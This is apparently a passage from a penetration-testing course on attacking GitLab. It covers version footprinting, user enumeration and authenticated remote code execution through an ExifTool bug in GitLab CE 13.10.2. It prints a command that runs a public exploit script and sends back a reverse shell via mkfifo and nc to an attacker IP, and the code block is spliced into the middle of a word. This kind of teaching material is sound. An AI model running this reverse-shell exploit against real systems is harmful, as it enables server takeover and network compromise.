The only way to footprint the GitLab version number in use is by browsing to the `/help` page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version. If we cannot register an account, we may have to try a low-risk exploit such as [this](https://www.exploit-db.com/exploits/49821). We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly. There have been a few serious exploits against GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) and GitLab [11.4.7](https://www.exploit-db.com/exploits/49257) in the past few years as well as GitLab Community Edition [13.10.3](https://www.exploit-db.com/exploits/49821), [13.9.3](https://www.exploit-db.com/exploits/49944), and [13.10.2](https://www.exploit-db.com/exploits/49951).

We can also use the registration form to enumerate valid users

## Authenticated Remote Code Execution

Remote code execution vulnerabilities are typically considered the "cream of the crop" as access to the underlying server will likely grant us access to all data that resides on it (though we may need to escalate privileges first) and can serve as a foothold into the network for us to launch further attacks against other systems and potentially result in full network compromise. GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. W```shell-session
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```e can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.
